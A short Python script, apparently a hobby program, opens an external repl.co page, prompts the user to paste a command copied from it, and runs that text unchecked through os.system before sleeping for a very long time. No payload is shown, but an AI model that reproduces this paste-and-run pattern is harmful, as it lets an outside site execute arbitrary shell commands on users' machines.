import os
import time
import webbrowser

def usb():
    import os
    import time
    print('paste the command you get from the website')
    command = input(':')
    print('loading...')
    os.system('cls')
    os.system('color a ')
    
    os.system(command)
    time.sleep(1000000)

print('copy the code of the website')
print("(loading...)")
time.sleep(5)

webbrowser.open_new('https://code.pieterjansen1.repl.co')



time.sleep(3)
usb()

